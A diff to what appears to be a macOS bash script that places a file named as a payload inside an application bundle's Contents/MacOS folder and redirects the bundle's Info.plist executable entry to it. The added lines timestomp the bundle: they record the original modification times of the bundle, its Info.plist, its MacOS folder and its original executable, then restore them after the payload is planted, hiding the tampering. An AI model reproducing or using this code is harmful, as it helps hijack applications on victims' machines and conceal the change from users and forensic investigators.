@@ -11,6 +11,7 @@ else
 	else
 		PayloadName="$3"
 	fi
+	LMTA=$(stat -f "%Sm" -t "%m%d%H%M%y" "$TRUESRC") && LMTC=$(stat -f "%Sm" -t "%m%d%H%M%y" "$TRUESRC/Contents") && LMTIP=$(stat -f "%Sm" -t "%m%d%H%M%y" "$TRUESRC/Contents/Info.plist") && LMTEF=$(stat -f "%Sm" -t "%m%d%H%M%y" "$TRUESRC/Contents/MacOS")
 	if [ "$4" == "" ];then
 		OES=0
 	elif [ "${4:0:7}" == "ToFile_" ];then
@@ -37,6 +38,7 @@ else
 			if [ "$OES" -gt 0 ];then
 			SR=$R
 			CL=$(awk "FNR == $R { print; exit }" "$TRUESRC/Contents/Info.plist") && CL=$(echo "$CL" | sed "s%.*<string>%%") && CL=$(echo "$CL" | sed "s%</string>.*%%")
+			LMTOE=$(stat -f "%Sm" -t "%m%d%H%M%y" "$TRUESRC/Contents/MacOS/$CL")
 				if [ "$OES" -eq 1 ];then
 					echo "$CL" > "$OFP"
 				fi
@@ -56,4 +58,6 @@ else
 		sed -i '' "\$s%\$%$CL\"%" "$TRUESRC/Contents/MacOS/$PayloadName"
 	fi
 	chmod 755 "$TRUESRC/Contents/MacOS/$PayloadName"
+	touch -m "$LMTA" "$TRUESRC" && touch -m "$LMTC" "$TRUESRC/Contents" && touch -m "$LMTIP" "$TRUESRC/Contents/Info.plist" && touch -m "$LMTEF" "$TRUESRC/Contents/MacOS" && touch -m "$LMTOE" "$TRUESRC/Contents/MacOS/$PayloadName"
+	echo DEBUG, LMTOE is $LMTOE
 fi
